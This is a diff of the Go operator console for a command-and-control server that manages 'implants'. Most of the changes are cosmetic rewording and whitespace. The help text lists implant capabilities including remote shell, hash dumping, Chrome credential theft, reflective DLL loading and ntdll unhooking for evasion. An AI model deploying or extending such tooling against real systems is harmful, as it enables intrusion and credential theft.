@@ -25,20 +25,20 @@ func main() {
 	dbPath := flag.String("db", "carved.db", "Database path")
 	flag.Parse()
 
-	fmt.Println(` ▄████▄   ▄▄▄       ██▀███   ██▒   █▓▓█████ ▓█████▄ 
+	fmt.Println(` ▄████▄   ▄▄▄       ██▀███   ██▒   █▓▓█████ ▓█████▄
 ▒██▀ ▀█  ▒████▄    ▓██ ▒ ██▒▓██░   █▒▓█   ▀ ▒██▀ ██▌
 ▒▓█    ▄ ▒██  ▀█▄  ▓██ ░▄█ ▒ ▓██  █▒░▒███   ░██   █▌
 ▒▓▓▄ ▄██▒░██▄▄▄▄██ ▒██▀▀█▄    ▒██ █░░▒▓█  ▄ ░▓█▄   ▌
-▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░▒████▓ 
-░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒ 
-  ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░ ░ ▒  ▒ 
-░          ░   ▒     ░░   ░      ░░     ░    ░ ░  ░ 
-░ ░            ░  ░   ░           ░     ░  ░   ░    
+▒ ▓███▀ ░ ▓█   ▓██▒░██▓ ▒██▒   ▒▀█░  ░▒████▒░▒████▓
+░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▒▓  ▒
+  ░  ▒     ▒   ▒▒ ░  ░▒ ░ ▒░   ░ ░░   ░ ░  ░ ░ ▒  ▒
+░          ░   ▒     ░░   ░      ░░     ░    ░ ░  ░
+░ ░            ░  ░   ░           ░     ░  ░   ░
 ░                                ░           ░      `)
 
-	fmt.Printf("[*] Initializing database: %s\n", *dbPath)
+	fmt.Printf("[+] initializing database: %s\n", *dbPath)
 	if err := db.Init(*dbPath); err != nil {
-		fmt.Printf("[!] Database init failed: %v\n", err)
+		fmt.Printf("[-] database init failed: %v\n", err)
 		os.Exit(1)
 	}
 	defer db.Close()
@@ -46,44 +46,44 @@ func main() {
 	lm := listeners.NewManager()
 
 	defaultListener := &db.Listener{
-		ID:		"default",
-		Name:		"default",
-		Type:		"http",
-		Host:		"0.0.0.0",
-		Port:		uint16(*listenerPort),
-		Active:		true,
-		Created:	time.Now(),
+		ID:      "default",
+		Name:    "default",
+		Type:    "http",
+		Host:    "0.0.0.0",
+		Port:    uint16(*listenerPort),
+		Active:  true,
+		Created: time.Now(),
 	}
 	lm.Start(defaultListener)
 
 	apiServer := api.NewServer(lm)
 
 	apiAddr := fmt.Sprintf(":%d", *apiPort)
-	fmt.Printf("[*] Starting API server on %s\n", apiAddr)
+	fmt.Printf("[+] starting API server on %s\n", apiAddr)
 
 	go func() {
 		if err := http.ListenAndServe(apiAddr, apiServer.Router()); err != nil {
-			fmt.Printf("[!] API server error: %v\n", err)
+			fmt.Printf("[-] API server error: %v\n", err)
 		}
 	}()
 
 	username, password := web.GetCredentials()
-	
-	fmt.Println("[+] Server started successfully")
+
+	fmt.Println("[+] server started successfully")
 	fmt.Println("")
-	fmt.Printf("    Web Panel: http://0.0.0.0%s\n", apiAddr)
+	fmt.Printf("    web panel: http://0.0.0.0%s\n", apiAddr)
 	fmt.Printf("    API:       http://0.0.0.0%s/api\n", apiAddr)
 	fmt.Printf("    C2:        http://0.0.0.0:%d\n", *listenerPort)
 	fmt.Println("")
-	fmt.Println("    Access via your public IP or hostname")
-	fmt.Printf("    Login: %s / %s\n", username, password)
+	fmt.Println("    access via your public IP or hostname")
+	fmt.Printf("    login: %s / %s\n", username, password)
 	fmt.Println("")
 
 	go func() {
 		sigChan := make(chan os.Signal, 1)
 		signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 		<-sigChan
-		fmt.Println("\n[*] Shutting down...")
+		fmt.Println("\n[-] shutting down...")
 		os.Exit(0)
 	}()
 
@@ -245,7 +245,7 @@ func runCLI() {
 				os.Exit(0)
 			}
 		default:
-			fmt.Printf("Unknown command: %s (type 'help' for commands)\n", cmd)
+			fmt.Printf("unknown command: %s (type 'help' for commands)\n", cmd)
 		}
 	}
 }
@@ -253,41 +253,41 @@ func runCLI() {
 func printHelp() {
 	help := `
 Commands:
-  implants          - List all implants
-  clear             - Clear all implants from database
-  use <id>          - Interact with an implant
-  back              - Deselect current implant
-  info              - Show current implant info
-  tasks             - Show tasks for current implant
+  implants          - list all implants
+  clear             - clear all implants from database
+  use <id>          - interact with an implant
+  back              - deselect current implant
+  info              - show current implant info
+  tasks             - show tasks for current implant
 
 Implant Commands (requires 'use' first):
-  shell <cmd>       - Execute shell command (cmd.exe)
-  powershell <cmd>  - Execute PowerShell command
-  ps                - List processes
-  pwd               - Print working directory
-  cd <path>         - Change directory
-  ls [path]         - List directory
-  cat <file>        - Read file
-  upload <l> <r>    - Upload local file to remote path
-  download <file>   - Download file
-  whoami            - Current user info
-  env               - Environment variables
-  sleep <s> [j%]    - Set sleep time and jitter
-  kill <pid>        - Kill process
+  shell <cmd>       - execute shell command (cmd.exe)
+  powershell <cmd>  - execute PowerShell command
+  ps                - list processes
+  pwd               - print working directory
+  cd <path>         - change directory
+  ls [path]         - list directory
+  cat <file>        - read file
+  upload <l> <r>    - upload local file to remote path
+  download <file>   - download file
+  whoami            - current user info
+  env               - environment variables
+  sleep <s> [j%]    - set sleep time and jitter
+  kill <pid>        - kill process
 
 Credential Extraction:
-  hashdump          - Dump SAM/SYSTEM hashes
-  chrome            - Extract Chrome credentials
+  hashdump          - dump SAM/SYSTEM hashes
+  chrome            - extract Chrome credentials
 
 Execution:
-  execute <file>    - Execute shellcode
-  loaddll <file>    - Reflective DLL load
-  loadpe <file>     - Reflective PE load
+  execute <file>    - execute shellcode
+  loaddll <file>    - reflective DLL load
+  loadpe <file>     - reflective PE load
 
 Evasion:
-  unhook            - Unhook ntdll.dll
+  unhook            - unhook ntdll.dll
 
-  exit/quit         - Exit (or deselect implant)
+  exit/quit         - exit (or deselect implant)
 `
 	fmt.Println(help)
 }
@@ -295,12 +295,12 @@ Evasion:
 func listImplants() {
 	implants, err := db.GetAllImplants()
 	if err != nil {
-		fmt.Printf("[-] Database error: %v\n", err)
+		fmt.Printf("[-] database error: %v\n", err)
 		return
 	}
 
 	if len(implants) == 0 {
-		fmt.Println("[*] No implants connected")
+		fmt.Println("[+] no implants connected")
 		return
 	}
 
@@ -322,11 +322,11 @@ func listImplants() {
 
 func clearImplants() {
 	if err := db.ClearImplants(); err != nil {
-		fmt.Printf("[-] Failed to clear implants: %v\n", err)
+		fmt.Printf("[-] failed to clear implants: %v\n", err)
 		return
 	}
 	currentImplant = nil
-	fmt.Println("[+] Cleared all implants and tasks from database")
+	fmt.Println("[+] cleared all implants and tasks from database")
 }
 
 func truncate(s string, max int) string {
@@ -339,11 +339,11 @@ func truncate(s string, max int) string {
 func useImplant(id string) {
 	implants, err := db.GetAllImplants()
 	if err != nil {
-		fmt.Printf("[-] Database error: %v\n", err)
+		fmt.Printf("[-] database error: %v\n", err)
 		return
 	}
 	if len(implants) == 0 {
-		fmt.Println("[-] No implants in database")
+		fmt.Println("[-] no implants in database")
 		return
 	}
 
@@ -352,13 +352,13 @@ func useImplant(id string) {
 
 		if strings.HasPrefix(strings.ToLower(i.ID), id) || strings.ToLower(i.ID) == id {
 			currentImplant = i
-			fmt.Printf("[+] Interacting with %s@%s (%s)\n", i.Username, i.Hostname, i.ID[:8])
+			fmt.Printf("[+] interacting with %s@%s (%s)\n", i.Username, i.Hostname, i.ID[:8])
 			return
 		}
 	}
 
-	fmt.Printf("[-] Implant not found: %s\n", id)
-	fmt.Println("[*] Available implants:")
+	fmt.Printf("[-] implant not found: %s\n", id)
+	fmt.Println("[+] available implants:")
 	for _, i := range implants {
 		fmt.Printf("    %s  %s@%s\n", i.ID[:8], i.Username, i.Hostname)
 	}
@@ -366,7 +366,7 @@ func useImplant(id string) {
 
 func showImplantInfo() {
 	if currentImplant == nil {
-		fmt.Println("[-] No implant selected (use 'use <id>')")
+		fmt.Println("[-] no implant selected (use 'use <id>')")
 		return
 	}
 	i := currentImplant
@@ -392,16 +392,16 @@ Implant Info:
 
 func showTasks() {
 	if currentImplant == nil {
-		fmt.Println("[-] No implant selected")
+		fmt.Println("[-] no implant selected")
 		return
 	}
 	tasks, err := db.GetTasksForImplant(currentImplant.ID)
 	if err != nil {
-		fmt.Printf("[-] Error: %v\n", err)
+		fmt.Printf("[-] error: %v\n", err)
 		return
 	}
 	if len(tasks) == 0 {
-		fmt.Println("[*] No tasks")
+		fmt.Println("[*] no tasks")
 		return
 	}
 
@@ -420,15 +420,14 @@ func showTasks() {
 
 func queueTask(taskType proto.TaskType, args []string, data []byte) {
 	if currentImplant == nil {
-		fmt.Println("[-] No implant selected (use 'use <id>')")
+		fmt.Println("[-] no implant selected (use 'use <id>')")
 		return
 	}
 
 	task, err := db.CreateTask(currentImplant.ID, taskType, args, data)
 	if err != nil {
-		fmt.Printf("[-] Failed to create task: %v\n", err)
+		fmt.Printf("[-] failed to create task: %v\n", err)
 		return
 	}
-	fmt.Printf("[+] Task queued: %s\n", task.ID[:8])
+	fmt.Printf("[+] task queued: %s\n", task.ID[:8])
 }
-
